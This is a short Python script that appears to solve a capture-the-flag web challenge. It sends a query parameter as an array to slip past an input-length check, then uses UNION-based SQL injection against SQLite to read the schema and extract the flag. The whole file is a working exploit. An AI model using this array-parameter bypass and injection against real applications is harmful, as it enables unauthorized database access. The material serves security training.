from requests import Session

s = Session()

BASE_URL = 'https://ez-sql-4870b6926aa143e7.tjc.tf'

# because express urlencoded is true, we can send an array with our request
# the length of our array will be 1, but when JS prints it, all the elements will be concatenated
# using this, we can send a payload that the server accepts which is also more than 6 chars
def sqli(payload):
    return s.get(f'{BASE_URL}/search?name[0]={payload}').text

# get the flag table name, then get the flag
table = sqli(
    "djfksdfd' UNION SELECT 1, sql FROM sqlite_master WHERE type=\"table\" --").split(' ')[2]

print(sqli(f"djfksdfd' UNION SELECT 1, flag FROM {table}--").split("\"")[5])
